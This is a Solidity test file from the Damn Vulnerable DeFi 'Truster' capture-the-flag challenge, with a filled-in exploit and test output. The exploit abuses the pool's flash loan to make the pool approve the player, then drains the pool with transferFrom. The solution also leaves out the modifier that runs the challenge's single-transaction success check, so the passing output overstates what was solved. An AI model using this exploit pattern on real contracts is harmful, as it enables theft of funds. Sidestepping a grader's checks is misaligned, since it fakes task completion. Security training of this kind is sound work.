// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    /*
        run :
        forge test --match-path test/truster/Truster.t.sol

        result :
        [⠆] Compiling...
        No files changed, compilation skipped

        Ran 2 tests for test/truster/Truster.t.sol:TrusterChallenge
        [PASS] test_assertInitialState() (gas: 21984)
        [PASS] test_truster() (gas: 68127)
        Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 69.83ms (4.74ms CPU time)

        Ran 1 test suite in 102.96ms (69.83ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
    */
    function test_truster() public {
        vm.startPrank(player);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            TOKENS_IN_POOL
        );

        pool.flashLoan(0, player, address(token), data);

        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);

        vm.stopPrank();

        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }



    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
